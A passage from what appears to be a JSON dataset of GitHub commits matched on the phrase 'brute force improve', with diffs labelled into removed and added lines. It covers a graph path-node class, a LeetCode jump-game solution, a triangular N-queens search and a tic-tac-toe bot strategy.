return 0\"\"\"\n        return 0\n\n    def get_next(self) -> _Node:\n        \"\"\"Raise a stop iteration error because no next exists\"\"\"\n        raise StopIteration\n\n    def __len__(self) -> int:\n        return 0\n\n\nclass _PathNode(_Node):\n    \"\"\"Path node for containing information about a path\n\n    \"\"\"\n    # Private Instance Attributes:\n    #   - item: the value of this node\n    #   - next: the node in the path prior to this one\n    #   - _path_weight: the cumulative weight along the entire path\n    #   - _weight: the weight between this node and its self.next\n    #   - _size: the size of this path\n\n    _item: Any\n    _next: _PathNode\n    _path_weight: float\n    _weight: float\n    _size: int\n\n    def __init__(self, item: Any, weight: float, parent: _PathNode = _NullPathNode()):\n        self._next = parent\n        self._item = item\n\n        self._size = len(parent) + 1\n        self._weight = weight\n        self._path_weight = parent.get_path_weight() + weight\n\n    def __len__(self) -> int:\n        return self._size\n\n    def get_item(self) -> Any:\n        \"\"\"Return the item associated with this _PathNode\"\"\"\n        return self._item\n\n    def get_next(self) -> _Node:\n        \"\"\"Return the _Node preceding this one in the path\"\"\"\n        return self._next\n\n    def get_path_weight(self) -> float:\n        \"\"\"Return the cumulative weight of this path\"\"\"\n        return self._path_weight\n\n    def get_weight(self) -> float:\n        \"\"\"Return the weight of this path node to its parent\"\"\"\n        return self._weight\n\n\nclass _PathIterator(Iterator[Any]):\n    \"\"\"Iterator pattern class for iterating through the path formed by _PathNodes\n\n    Iterates through the _PathNode .next chain in order.\n    \"\"\"\n\n    _current_node: _Node\n\n    def __init__(self, initial_node: _Node):\n        self._current_node = initial_node\n\n    def __next__(self) -> Any:\n        cur = self._current_node\n        self._current_node = self._current_node.get_next()\n        return cur.get_item()\n"}},"msg":"Added graph resizing (close to brute force, can be improved)"}},"https:\/\/github.com\/alphasingh\/competitive-programming":{"9272f854151211dcf14551135bd65e41f5556ffc":{"url":"https:\/\/api.github.com\/repos\/alphasingh\/competitive-programming\/commits\/9272f854151211dcf14551135bd65e41f5556ffc","html_url":"https:\/\/github.com\/alphasingh\/competitive-programming\/commit\/9272f854151211dcf14551135bd65e41f5556ffc","message":"Improved brute force with extra checks gives TLE","sha":"9272f854151211dcf14551135bd65e41f5556ffc","keyword":"brute force improve","diff":"diff --git a\/leetcode\/medium\/jump_game.py b\/leetcode\/medium\/jump_game.py\nindex 9ef2262..5539fb1 100644\n--- a\/leetcode\/medium\/jump_game.py\n+++ b\/leetcode\/medium\/jump_game.py\n@@ -6,19 +6,25 @@\n class Solution:\n     @staticmethod\n     def canJump(nums: [int]) -> bool:\n-        to_be_visited = {0}  # first visit at the starting index\n+        to_be_visited = [0]  # first visit at the starting index\n         size_nums = len(nums)\n         visited = [False] * size_nums  # to keep track of the visited elements\n+        max_visit = 0  # maximum visit reached\n         while to_be_visited:\n             current_visit = to_be_visited.pop()\n             visited[current_visit] = True\n             range_start = current_visit + 1\n             range_end = range_start + nums[current_visit]  # until maximum jump\n-            if range_end > size_nums:  # exclude impossible jumps\n-                range_end = size_nums\n+            if range_end >= size_nums:\n+                visited[-1] = True  # last index can be reached\n+                break\n+            if range_end <= max_visit:\n+                continue\n+            else:\n+                range_start = max_visit\n             for index in range(range_start, range_end):\n-                if not visited[index]:\n-                    to_be_visited.add(index)\n+                if not visited[index] and index not in to_be_visited:\n+                    to_be_visited.append(index)\n         return visited[-1]  # last index visited\n \n \n","files":{"\/leetcode\/medium\/jump_game.py":{"changes":[{"diff":"\n class Solution:\n     @staticmethod\n     def canJump(nums: [int]) -> bool:\n-        to_be_visited = {0}  # first visit at the starting index\n+        to_be_visited = [0]  # first visit at the starting index\n         size_nums = len(nums)\n         visited = [False] * size_nums  # to keep track of the visited elements\n+        max_visit = 0  # maximum visit reached\n         while to_be_visited:\n             current_visit = to_be_visited.pop()\n             visited[current_visit] = True\n             range_start = current_visit + 1\n             range_end = range_start + nums[current_visit]  # until maximum jump\n-            if range_end > size_nums:  # exclude impossible jumps\n-                range_end = size_nums\n+            if range_end >= size_nums:\n+                visited[-1] = True  # last index can be reached\n+                break\n+            if range_end <= max_visit:\n+                continue\n+            else:\n+                range_start = max_visit\n             for index in range(range_start, range_end):\n-                if not visited[index]:\n-                    to_be_visited.add(index)\n+                if not visited[index] and index not in to_be_visited:\n+                    to_be_visited.append(index)\n         return visited[-1]  # last index visited\n \n \n","add":11,"remove":5,"filename":"\/leetcode\/medium\/jump_game.py","badparts":["        to_be_visited = {0}  # first visit at the starting index","            if range_end > size_nums:  # exclude impossible jumps","                range_end = size_nums","                if not visited[index]:","                    to_be_visited.add(index)"],"goodparts":["        to_be_visited = [0]  # first visit at the starting index","        max_visit = 0  # maximum visit reached","            if range_end >= size_nums:","                visited[-1] = True  # last index can be reached","                break","            if range_end <= max_visit:","                continue","            else:","                range_start = max_visit","                if not visited[index] and index not in to_be_visited:","                    to_be_visited.append(index)"]}],"source":"\n\"\"\" https:\/\/leetcode.com\/problems\/jump-game\/ \"\"\" class Solution: @staticmethod def canJump(nums:[int]) -> bool: to_be_visited={0} size_nums=len(nums) visited=[False] * size_nums while to_be_visited: current_visit=to_be_visited.pop() visited[current_visit]=True range_start=current_visit +1 range_end=range_start +nums[current_visit] if range_end > size_nums: range_end=size_nums for index in range(range_start, range_end): if not visited[index]: to_be_visited.add(index) return visited[-1] assert Solution.canJump(nums=[2, 3, 1, 1, 4]) is True assert Solution.canJump(nums=[3, 2, 1, 0, 4]) is False ","sourceWithComments":"\"\"\"\nhttps:\/\/leetcode.com\/problems\/jump-game\/\n\"\"\"\n\n\nclass Solution:\n    @staticmethod\n    def canJump(nums: [int]) -> bool:\n        to_be_visited = {0}  # first visit at the starting index\n        size_nums = len(nums)\n        visited = [False] * size_nums  # to keep track of the visited elements\n        while to_be_visited:\n            current_visit = to_be_visited.pop()\n            visited[current_visit] = True\n            range_start = current_visit + 1\n            range_end = range_start + nums[current_visit]  # until maximum jump\n            if range_end > size_nums:  # exclude impossible jumps\n                range_end = size_nums\n            for index in range(range_start, range_end):\n                if not visited[index]:\n                    to_be_visited.add(index)\n        return visited[-1]  # last index visited\n\n\nassert Solution.canJump(nums=[2, 3, 1, 1, 4]) is True\n# Explanation: Jump 1 step from index 0 to 1, then 3 steps to the last index.\nassert Solution.canJump(nums=[3, 2, 1, 0, 4]) is False\n# Explanation: You will always arrive at index 3 no matter what.\n# Its maximum jump length is 0, which makes it impossible to reach the last index.\n"}},"msg":"Improved brute force with extra checks gives TLE"}},"https:\/\/github.com\/domanteli0\/ADS":{"4cd728b7c50571efd66f0c3c32e08cf7ed63b847":{"url":"https:\/\/api.github.com\/repos\/domanteli0\/ADS\/commits\/4cd728b7c50571efd66f0c3c32e08cf7ed63b847","html_url":"https:\/\/github.com\/domanteli0\/ADS\/commit\/4cd728b7c50571efd66f0c3c32e08cf7ed63b847","message":"Improved the brute-force method.\nNow, it stops searching then a valid board is found.\n\n---PSP---\nAction: Kodavimas\nFrom: @prev_commit\nTag: Task2","sha":"4cd728b7c50571efd66f0c3c32e08cf7ed63b847","keyword":"brute force improve","diff":"diff --git a\/Task2\/main.py b\/Task2\/main.py\nindex 6b2c51a..cdba61b 100644\n--- a\/Task2\/main.py\n+++ b\/Task2\/main.py\n@@ -93,18 +93,22 @@ def place(boards, board, poz, left):\n             board_copy = board.copy()\n             board_copy[p] = 1\n             \n-            if left == 0:\n+            #                                           this part: len(boards) == 0,\n+            #                                           can be commented out\n+            #                                           if one wishes to find all valid\n+            #                                           boards\n+            if left == 0 and check_board(board_copy, m) and len(boards) == 0:\n                 boards.insert(len(boards), board_copy)\n             elif left >= 1:\n                 place(boards, board_copy, p, left - 1)\n-                    \n+    \n     return boards\n \n # Matrixes are initialized with zeroes \n # 1 indicates a placed queen\n # n is a number of queens\n # m - m x m matrix dimension\n-def get_permutations(m, n):\n+def get_valid(m, n):\n     return place([], [0] * sum(range(0, m + 1)), -1, n - 1)\n \n \n@@ -122,6 +126,7 @@ def print_board(board, m):\n \n \n if __name__ == '__main__':\n+    # Command line option parsing\n     if len(sys.argv) == 3:\n         m = int(sys.argv[1])  # M\n         n = int(sys.argv[2])  # N\n@@ -129,12 +134,13 @@ def print_board(board, m):\n     else:\n         print(\"Missing arguments\")\n         exit()\n-\n-    print(\"VALID BOARDS: \")\n-    boards = get_permutations(m, n)\n-    for board in boards:\n-        if check_board(board, m):\n-            print(\"\")\n-            print(board)\n+        \n+    # The interesting part\n+    boards = get_valid(m, n)\n+    \n+    # prints valid boards\n+    if len(boards) > 0:\n+        print(\"VALID BOARD FOUND: \")\n+        for board in boards:\n             print_board(board, m)\n             \n\\ No newline at end of file\n","files":{"\/Task2\/main.py":{"changes":[{"diff":"\n             board_copy = board.copy()\n             board_copy[p] = 1\n             \n-            if left == 0:\n+            #                                           this part: len(boards) == 0,\n+            #                                           can be commented out\n+            #                                           if one wishes to find all valid\n+            #                                           boards\n+            if left == 0 and check_board(board_copy, m) and len(boards) == 0:\n                 boards.insert(len(boards), board_copy)\n             elif left >= 1:\n                 place(boards, board_copy, p, left - 1)\n-                    \n+    \n     return boards\n \n # Matrixes are initialized with zeroes \n # 1 indicates a placed queen\n # n is a number of queens\n # m - m x m matrix dimension\n-def get_permutations(m, n):\n+def get_valid(m, n):\n     return place([], [0] * sum(range(0, m + 1)), -1, n - 1)\n \n \n","add":7,"remove":3,"filename":"\/Task2\/main.py","badparts":["            if left == 0:","def get_permutations(m, n):"],"goodparts":["            if left == 0 and check_board(board_copy, m) and len(boards) == 0:","def get_valid(m, n):"]},{"diff":"\n     else:\n         print(\"Missing arguments\")\n         exit()\n-\n-    print(\"VALID BOARDS: \")\n-    boards = get_permutations(m, n)\n-    for board in boards:\n-        if check_board(board, m):\n-            print(\"\")\n-            print(board)\n+        \n+    # The interesting part\n+    boards = get_valid(m, n)\n+    \n+    # prints valid boards\n+    if len(boards) > 0:\n+        print(\"VALID BOARD FOUND: \")\n+        for board in boards:\n             print_board(board, m)\n             \n\\ No newline at end of file\n","add":8,"remove":7,"filename":"\/Task2\/main.py","badparts":["    print(\"VALID BOARDS: \")","    boards = get_permutations(m, n)","    for board in boards:","        if check_board(board, m):","            print(\"\")","            print(board)"],"goodparts":["    boards = get_valid(m, n)","    if len(boards) > 0:","        print(\"VALID BOARD FOUND: \")","        for board in boards:"]}],"source":"\n import sys def triangular_numbers(n): i, t=1, 0 while i <=n: yield t t +=i i +=1 def check_board(board, m): ix=0 jx=0 for row in range(0, m): ix +=row +1 if board[jx:ix].count(1) > 1: return False jx +=row +1 possitions=list(triangular_numbers(m)) for col in range(0, m): count=0 for pos in possitions: if board[pos]: count +=1 if count > 1: return False possitions=list(map(lambda x: x +1, possitions[1:])) possitions=list(triangular_numbers(m)) for diag in range(0, m): count=0 for ix, pos in enumerate(possitions): if board[ix +pos]: count +=1 if count > 1: return False possitions=possitions[1:] return True def check_cell(board, m, poz): return True def place(boards, board, poz, left): if left >=0: ran=range(poz +1, len(board) -left) for p in ran: board_copy=board.copy() board_copy[p]=1 if left==0: boards.insert(len(boards), board_copy) elif left >=1: place(boards, board_copy, p, left -1) return boards def get_permutations(m, n): return place([],[0] * sum(range(0, m +1)), -1, n -1) def print_board(board, m): cell_count=sum(range(0, m +1)) if cell_count !=len(board): raise Exception(\"This board is not a triangle\", cell_count, len(board)) ix=0 jx=0 for l in range(0, m): ix +=l +1 print(board[jx:ix]) jx +=l +1 if __name__=='__main__': if len(sys.argv)==3: m=int(sys.argv[1]) n=int(sys.argv[2]) print(\"Dim: \", m, \" N:\", n) else: print(\"Missing arguments\") exit() print(\"VALID BOARDS: \") boards=get_permutations(m, n) for board in boards: if check_board(board, m): print(\"\") print(board) print_board(board, m) ","sourceWithComments":"# Task: Put N queens in a MxM triangle board\n# such as each queen cannot be insight of another queen\n# \n# Original wording:\n# \"Rasti N valdovi\u0173 i\u0161d\u0117stym\u0105 M trikamp\u0117je lentoje, kad jos viena kitos nekirst\u0173.\"\n\nimport sys\n\ndef triangular_numbers(n):\n    i, t = 1, 0\n    while i <= n:\n        yield t\n        t += i\n        i += 1\n    \n# Checks if a board is valid\ndef check_board(board, m):\n    \n    # checks rows\n    # Works by counting 1s in a sublists\n    ix = 0\n    jx = 0\n    for row in range(0, m):\n        ix += row + 1\n        if board[jx:ix].count(1) > 1:\n            return False\n        jx += row + 1\n    \n    # checks columns\n    \n    # builds a list of all possitions in that column\n    possitions = list(triangular_numbers(m))\n    for col in range(0, m):\n        count = 0\n        for pos in possitions:\n            if board[pos]:\n                count += 1\n            if count > 1:\n                return False\n        \n        possitions = list(map(lambda x: x + 1, possitions[1:]))\n\n    # Checks diagonals\n    possitions = list(triangular_numbers(m))\n    for diag in range(0, m):\n        \n        count = 0\n        for ix, pos in enumerate(possitions):\n            if board[ix + pos]:\n                count += 1\n            \n        if count > 1:\n            return False\n        \n        possitions = possitions[1:]\n    \n    return True\n\n# Checks if a queen doesn't collide with other\n# True => is valid i.e. doesn't collide\n# False => is NOT valid i.e. does collide\ndef check_cell(board, m, poz):\n    # cell_count = sum(range(0, m + 1))\n\n    # checks row\n    # ix = 0\n    # jx = 0\n    # for l in range(0, m):\n    #     ix += l + 1\n    #     print(board[jx:ix])\n    #     for ci, cell in enumerate(board[jx:ix]):\n    #         # print(type(cell))\n    #         if cell == 1 and ((ci + jx) != poz):\n    #             # print(board[jx:ix])\n    #             print(jx, ix, ci + jx, poz)\n    #             return False\n    #     jx += l + 1\n        \n        \n    # checks column\n    \n    # checks the diagonal upper of the queen\n    # checks the diagonal lower than the queen\n\n    return True\n\n# board is a list\ndef place(boards, board, poz, left):\n    \n    if left >= 0:\n        ran = range(poz + 1, len(board) - left)\n        for p in ran:\n            board_copy = board.copy()\n            board_copy[p] = 1\n            \n            if left == 0:\n                boards.insert(len(boards), board_copy)\n            elif left >= 1:\n                place(boards, board_copy, p, left - 1)\n                    \n    return boards\n\n# Matrixes are initialized with zeroes \n# 1 indicates a placed queen\n# n is a number of queens\n# m - m x m matrix dimension\ndef get_permutations(m, n):\n    return place([], [0] * sum(range(0, m + 1)), -1, n - 1)\n\n\ndef print_board(board, m):\n    cell_count = sum(range(0, m + 1))\n    if cell_count != len(board):\n        raise Exception(\"This board is not a triangle\", cell_count, len(board))\n\n    ix = 0\n    jx = 0\n    for l in range(0, m):\n        ix += l + 1\n        print(board[jx:ix])\n        jx += l + 1\n\n\nif __name__ == '__main__':\n    if len(sys.argv) == 3:\n        m = int(sys.argv[1])  # M\n        n = int(sys.argv[2])  # N\n        print(\"Dim: \", m, \" N:\", n)\n    else:\n        print(\"Missing arguments\")\n        exit()\n\n    print(\"VALID BOARDS: \")\n    boards = get_permutations(m, n)\n    for board in boards:\n        if check_board(board, m):\n            print(\"\")\n            print(board)\n            print_board(board, m)\n            "}},"msg":"Improved the brute-force method.\nNow, it stops searching then a valid board is found.\n\n---PSP---\nAction: Kodavimas\nFrom: @prev_commit\nTag: Task2"}},"https:\/\/github.com\/MicahWW\/Python-Games":{"6c11de7fbefb5d888d0c2544b6248eb459cc025f":{"url":"https:\/\/api.github.com\/repos\/MicahWW\/Python-Games\/commits\/6c11de7fbefb5d888d0c2544b6248eb459cc025f","html_url":"https:\/\/github.com\/MicahWW\/Python-Games\/commit\/6c11de7fbefb5d888d0c2544b6248eb459cc025f","message":"New and improved bot!\n\nThe previous approach was WAAAAY too brute force. Updated bot to use a new base strategy and some smart checking to reduce edge-cases down to three unique scenarios (as well as factoring in rotations\/reflections of those scenarios).  I have not been this confident since the last time I asked @MicahWW to check the bot, and that request is going out again now!","sha":"6c11de7fbefb5d888d0c2544b6248eb459cc025f","keyword":"brute force improve","diff":"diff --git a\/TicTacToe.py b\/TicTacToe.py\nindex 15413e3..1991398 100644\n--- a\/TicTacToe.py\n+++ b\/TicTacToe.py\n@@ -1,7 +1,6 @@\n \ufeffimport random\n import os\n from math import floor\n-from typing import Tuple, Callable\n \n \n ##########################################################################################\n@@ -46,6 +45,9 @@ def __init__(self):\n \t\tself.board = self.emptyBoard()\n \t\tself.game_state = self.GAME_IN_PROGRESS\n \n+\t\t# Initialize move history\n+\t\tself.move_history = []\n+\n \t@staticmethod\n \tdef gameName():\n \t\t\"\"\"returns the name of the game (namely, the name \"Tic-Tac-Toe\").\n@@ -82,11 +84,12 @@ def updateBoard(self, row, col, player_values):\n \n \t\t:param row: the row of the space to be updated.\n \t\t:param col: the column of the space to be updated.\n-\t\t:param player_icon: the icon to be put in the space (traditionally X or O).\n+\t\t:param player_values: the icon to be put in the space (traditionally X or O).\n \t\t\"\"\"\n \n \t\tif player_values in (self.PLAYER_0, self.PLAYER_1, self.BLANK_POS):\n \t\t\tself.board[row][col] = player_values\n+\t\t\tself.move_history.append((row, col))\n \t\t\tself.checkBoard()\n \t\telse:\n \t\t\terr = (\n@@ -144,24 +147,13 @@ def checkBoard(self):\n \t\treturn\n \n \tdef botMove(self, bot_icon):\n-\t\t\"\"\"The brains of the most unbeatable bot this side of the singularity.\n-\t\tOkay probably not, but it should at least block easy wins.\n-\n-\t\t:param bot_icon: either self.PLAYER_0 or self.PLAYER_1, used by the bot to distinguish user from bot.\n-\t\t:return: (row, col) as integers representing the row and column of bot's desired move.\n-\t\t\"\"\"\n-\n-\t\t# Initialize valid_move as required by the while loop\n \t\tvalid_move = False\n-\t\t# Initialize row and col, because it's the right thing to do\n \t\trow, col = 0, 0\n-\t\t# Initialize not_bot_icon because who wants to read \"self.PLAYER_1\"\n-\t\t# and all the logic that goes into figuring out if that's even the right icon to use?\n \t\tif bot_icon == self.PLAYER_0:\n \t\t\tnot_bot_icon = self.PLAYER_1\n \t\telse:\n \t\t\tnot_bot_icon = self.PLAYER_0\n-\t\t# List of tuples containing the (row,col) of all possible win scenarios\n+\n \t\twin_options = [\n \t\t\t[(0, 0), (0, 1), (0, 2)],\n \t\t\t[(1, 0), (1, 1), (1, 2)],\n@@ -189,6 +181,13 @@ def botMove(self, bot_icon):\n \t\t\t\t\t\trow = i[0]\n \t\t\t\t\t\tcol = i[1]\n \t\t\t\t\t\treturn row, col\n+\t\tfor option in win_options:\n+\t\t\t# Initialize score_keeper for reading the board for win scenarios\n+\t\t\tscore_keeper = {self.PLAYER_0: 0, self.PLAYER_1: 0, self.BLANK_POS: 0}\n+\t\t\t# determine what is in each space and record with score_keeper\n+\t\t\t# i is the individual space in any given win scenario, i[0] is row and i[1] is col\n+\t\t\tfor i in option:\n+\t\t\t\tscore_keeper[self.board[i[0]][i[1]]] += 1\n \t\t\t# if there are two opponent icons set to win and a blank space available,\n \t\t\t# select the blank space to block the opponent from winning\n \t\t\tif score_keeper[not_bot_icon] == 2 and score_keeper[self.BLANK_POS] == 1:\n@@ -198,10 +197,79 @@ def botMove(self, bot_icon):\n \t\t\t\t\t\tcol = i[1]\n \t\t\t\t\t\treturn row, col\n \n-\t\t# If the bot escapes the win-checker loop and finds no imminent win scenarios, select a random space\n+\t\t# Initialize turn counter\n+\t\tturn_counter = 9\n+\t\tfor i in range(0, 3):\n+\t\t\tfor j in range(0, 3):\n+\t\t\t\tif self.board[i][j] == self.BLANK_POS:\n+\t\t\t\t\tturn_counter -= 1\n+\n+\t\t# Check for middle-opener edge-case\n+\t\tif bot_icon == self.PLAYER_1 and turn_counter == 1:\n+\t\t\tif self.board[1][1] == self.PLAYER_0:\n+\t\t\t\twhile not valid_move:\n+\t\t\t\t\trow = random.choice((0, 2))\n+\t\t\t\t\tcol = random.choice((0, 2))\n+\t\t\t\t\tvalid_move = self.checkValidMove(row, col)\n+\t\t\t\treturn row, col\n+\n+\t\t# Check for edge-cases (that happen on turn 3)\n+\t\tif bot_icon == self.PLAYER_1 and turn_counter == 3:\n+\t\t\t# Check for first edge-case: see board [[X, , ], [ ,X, ], [ , ,O]]\n+\t\t\t# In this (or rotated) situation, bot should select a corner space\n+\t\t\tif self.board[1][1] == self.PLAYER_0:\n+\t\t\t\t# Check for scenario\n+\t\t\t\tif ((self.board[0][0] != self.BLANK_POS !=\n+\t\t\t\t\tself.board[2][2] != self.board[0][0]) or\n+\t\t\t\t\t\t(self.board[0][2] != self.BLANK_POS !=\n+\t\t\t\t\t\tself.board[2][0] != self.board[0][2])):\n+\t\t\t\t\t# Select an open corner space\n+\t\t\t\t\twhile not valid_move:\n+\t\t\t\t\t\trow = random.choice((0, 2))\n+\t\t\t\t\t\tcol = random.choice((0, 2))\n+\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)\n+\t\t\t\t\treturn row, col\n+\n+\t\t\t# Check for second edge-case: see board [[ ,X, ], [ ,O, ], [X, , ]]\n+\t\t\t# In this scenario, bot loses if it selects (2, 1).  Avoid this (or rotated) scenarios.\n+\t\t\tif self.board[1][1] == bot_icon:\n+\t\t\t\tif self.board[0][1] != self.board[1][1] != self.board[2][1] != self.board[0][1]:\n+\t\t\t\t\twhile not valid_move:\n+\t\t\t\t\t\trow = random.choice((0, 1, 2))\n+\t\t\t\t\t\tcol = random.choice((0, 1, 2))\n+\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)\n+\t\t\t\t\t\tif (row, col) in ((0, 1), (2, 1)):\n+\t\t\t\t\t\t\tvalid_move = False\n+\t\t\t\t\treturn row, col\n+\t\t\t\telif self.board[1][0] != self.board[1][1] != self.board[1][2] != self.board[1][0]:\n+\t\t\t\t\twhile not valid_move:\n+\t\t\t\t\t\trow = random.choice((0, 1, 2))\n+\t\t\t\t\t\tcol = random.choice((0, 1, 2))\n+\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)\n+\t\t\t\t\t\tif (row, col) in ((1, 0), (1, 2)):\n+\t\t\t\t\t\t\tvalid_move = False\n+\t\t\t\t\treturn row, col\n+\n+\t\t# If the bot escapes the win-checker loop and edge-cases, select a space using criteria\n+\t\t# Explanation of criteria: imagine a tic-tac-toe board colored like checkerboard.\n+\t\t# If human player plays on white space, bot tries to play black space, or vice versa.\n+\t\t# This is implemented using an odd\/even scheme of the board positions.\n+\t\tlast_opponent_move = self.move_history[-1]\n \t\twhile not valid_move:\n-\t\t\trow = random.choice([0, 1, 2])\n-\t\t\tcol = random.choice([0, 1, 2])\n+\t\t\tif turn_counter == 1 and self.board[1][1] == self.BLANK_POS:\n+\t\t\t\trow, col = (1, 1)\n+\t\t\telse:\n+\t\t\t\trow = random.choice((0, 1, 2))\n+\t\t\t\tif (last_opponent_move[0] + last_opponent_move[1]) % 2 == 0:\n+\t\t\t\t\tif row in (0, 2):\n+\t\t\t\t\t\tcol = 1\n+\t\t\t\t\telse:\n+\t\t\t\t\t\tcol = random.choice((0, 2))\n+\t\t\t\telse:\n+\t\t\t\t\tif row == 1:\n+\t\t\t\t\t\tcol = 1\n+\t\t\t\t\telse:\n+\t\t\t\t\t\tcol = random.choice((0, 2))\n \t\t\tvalid_move = self.checkValidMove(row, col)\n \n \t\treturn row, col\n@@ -221,7 +289,7 @@ def __init__(self):\n \t\tself.blank_pos_color = \"\\033[1;32m\"\n \t\tself.exit_color_code = \"\\033[0m\"\n \n-\t\t# How the palyers are displayed\n+\t\t# How the players are displayed\n \t\tself.PLAYER_0_ICON = 'X'\n \t\tself.PLAYER_1_ICON = 'O'\n \n@@ -235,19 +303,19 @@ def advancedGameSettings(self, setting_to_change):\n \t\t\t\tprint('Both player icons must only be 1 character long.')\n \t\t\t\tplayer0 = 'too long'\n \t\t\t\twhile len(player0) != 1:\n-\t\t\t\t\tplayer0 = input('What do you want first move icon to be? (Traditionaly X): ')\n+\t\t\t\t\tplayer0 = input('What do you want first move icon to be? (Traditionally X): ')\n \t\t\t\t\tif len(player0) != 1:\n \t\t\t\t\t\tprint(\"Please enter a single character for the player icon\")\n \n \t\t\t\tplayer1 = 'too long'\n \t\t\t\twhile len(player1) != 1:\n-\t\t\t\t\tplayer1 = input('What do you want second move icon to be? (Traditionaly O): ')\n+\t\t\t\t\tplayer1 = input('What do you want second move icon to be? (Traditionally O): ')\n \t\t\t\t\tif len(player0) != 1:\n \t\t\t\t\t\tprint(\"Please enter a single character for the player icon\")\n \n \t\t\t\tself.updatePlayerIcons(player0, player1)\n \n-\tdef gameSettingsPrompt(self) -> Tuple[Callable, Callable]:\n+\tdef gameSettingsPrompt(self):\n \t\t\"\"\"Prints messages to allow the user to select number of players then choose their icon\n \t\tTakes no inputs\n \n","files":{"\/TicTacToe.py":{"changes":[{"diff":"\n \ufeffimport random\n import os\n from math import floor\n-from typing import Tuple, Callable\n \n \n ##########################################################################################\n","add":0,"remove":1,"filename":"\/TicTacToe.py","badparts":["from typing import Tuple, Callable"],"goodparts":[]},{"diff":"\n \n \t\t:param row: the row of the space to be updated.\n \t\t:param col: the column of the space to be updated.\n-\t\t:param player_icon: the icon to be put in the space (traditionally X or O).\n+\t\t:param player_values: the icon to be put in the space (traditionally X or O).\n \t\t\"\"\"\n \n \t\tif player_values in (self.PLAYER_0, self.PLAYER_1, self.BLANK_POS):\n \t\t\tself.board[row][col] = player_values\n+\t\t\tself.move_history.append((row, col))\n \t\t\tself.checkBoard()\n \t\telse:\n \t\t\terr = (\n","add":2,"remove":1,"filename":"\/TicTacToe.py","badparts":["\t\t:param player_icon: the icon to be put in the space (traditionally X or O)."],"goodparts":["\t\t:param player_values: the icon to be put in the space (traditionally X or O).","\t\t\tself.move_history.append((row, col))"]},{"diff":"\n \t\treturn\n \n \tdef botMove(self, bot_icon):\n-\t\t\"\"\"The brains of the most unbeatable bot this side of the singularity.\n-\t\tOkay probably not, but it should at least block easy wins.\n-\n-\t\t:param bot_icon: either self.PLAYER_0 or self.PLAYER_1, used by the bot to distinguish user from bot.\n-\t\t:return: (row, col) as integers representing the row and column of bot's desired move.\n-\t\t\"\"\"\n-\n-\t\t# Initialize valid_move as required by the while loop\n \t\tvalid_move = False\n-\t\t# Initialize row and col, because it's the right thing to do\n \t\trow, col = 0, 0\n-\t\t# Initialize not_bot_icon because who wants to read \"self.PLAYER_1\"\n-\t\t# and all the logic that goes into figuring out if that's even the right icon to use?\n \t\tif bot_icon == self.PLAYER_0:\n \t\t\tnot_bot_icon = self.PLAYER_1\n \t\telse:\n \t\t\tnot_bot_icon = self.PLAYER_0\n-\t\t# List of tuples containing the (row,col) of all possible win scenarios\n+\n \t\twin_options = [\n \t\t\t[(0, 0), (0, 1), (0, 2)],\n \t\t\t[(1, 0), (1, 1), (1, 2)],\n","add":1,"remove":12,"filename":"\/TicTacToe.py","badparts":["\t\t\"\"\"The brains of the most unbeatable bot this side of the singularity.","\t\tOkay probably not, but it should at least block easy wins.","\t\t:param bot_icon: either self.PLAYER_0 or self.PLAYER_1, used by the bot to distinguish user from bot.","\t\t:return: (row, col) as integers representing the row and column of bot's desired move.","\t\t\"\"\""],"goodparts":[]},{"diff":"\n \t\t\t\t\t\tcol = i[1]\n \t\t\t\t\t\treturn row, col\n \n-\t\t# If the bot escapes the win-checker loop and finds no imminent win scenarios, select a random space\n+\t\t# Initialize turn counter\n+\t\tturn_counter = 9\n+\t\tfor i in range(0, 3):\n+\t\t\tfor j in range(0, 3):\n+\t\t\t\tif self.board[i][j] == self.BLANK_POS:\n+\t\t\t\t\tturn_counter -= 1\n+\n+\t\t# Check for middle-opener edge-case\n+\t\tif bot_icon == self.PLAYER_1 and turn_counter == 1:\n+\t\t\tif self.board[1][1] == self.PLAYER_0:\n+\t\t\t\twhile not valid_move:\n+\t\t\t\t\trow = random.choice((0, 2))\n+\t\t\t\t\tcol = random.choice((0, 2))\n+\t\t\t\t\tvalid_move = self.checkValidMove(row, col)\n+\t\t\t\treturn row, col\n+\n+\t\t# Check for edge-cases (that happen on turn 3)\n+\t\tif bot_icon == self.PLAYER_1 and turn_counter == 3:\n+\t\t\t# Check for first edge-case: see board [[X, , ], [ ,X, ], [ , ,O]]\n+\t\t\t# In this (or rotated) situation, bot should select a corner space\n+\t\t\tif self.board[1][1] == self.PLAYER_0:\n+\t\t\t\t# Check for scenario\n+\t\t\t\tif ((self.board[0][0] != self.BLANK_POS !=\n+\t\t\t\t\tself.board[2][2] != self.board[0][0]) or\n+\t\t\t\t\t\t(self.board[0][2] != self.BLANK_POS !=\n+\t\t\t\t\t\tself.board[2][0] != self.board[0][2])):\n+\t\t\t\t\t# Select an open corner space\n+\t\t\t\t\twhile not valid_move:\n+\t\t\t\t\t\trow = random.choice((0, 2))\n+\t\t\t\t\t\tcol = random.choice((0, 2))\n+\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)\n+\t\t\t\t\treturn row, col\n+\n+\t\t\t# Check for second edge-case: see board [[ ,X, ], [ ,O, ], [X, , ]]\n+\t\t\t# In this scenario, bot loses if it selects (2, 1).  Avoid this (or rotated) scenarios.\n+\t\t\tif self.board[1][1] == bot_icon:\n+\t\t\t\tif self.board[0][1] != self.board[1][1] != self.board[2][1] != self.board[0][1]:\n+\t\t\t\t\twhile not valid_move:\n+\t\t\t\t\t\trow = random.choice((0, 1, 2))\n+\t\t\t\t\t\tcol = random.choice((0, 1, 2))\n+\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)\n+\t\t\t\t\t\tif (row, col) in ((0, 1), (2, 1)):\n+\t\t\t\t\t\t\tvalid_move = False\n+\t\t\t\t\treturn row, col\n+\t\t\t\telif self.board[1][0] != self.board[1][1] != self.board[1][2] != self.board[1][0]:\n+\t\t\t\t\twhile not valid_move:\n+\t\t\t\t\t\trow = random.choice((0, 1, 2))\n+\t\t\t\t\t\tcol = random.choice((0, 1, 2))\n+\t\t\t\t\t\tvalid_move = self.checkValidMove(row, col)\n+\t\t\t\t\t\tif (row, col) in ((1, 0), (1, 2)):\n+\t\t\t\t\t\t\tvalid_move = False\n+\t\t\t\t\treturn row, col\n+\n+\t\t# If the bot escapes the win-checker loop and edge-cases, select a space using criteria\n+\t\t# Explanation of criteria: imagine a tic-tac-toe board colored like checkerboard.\n+\t\t# If human player plays on white space, bot tries to play 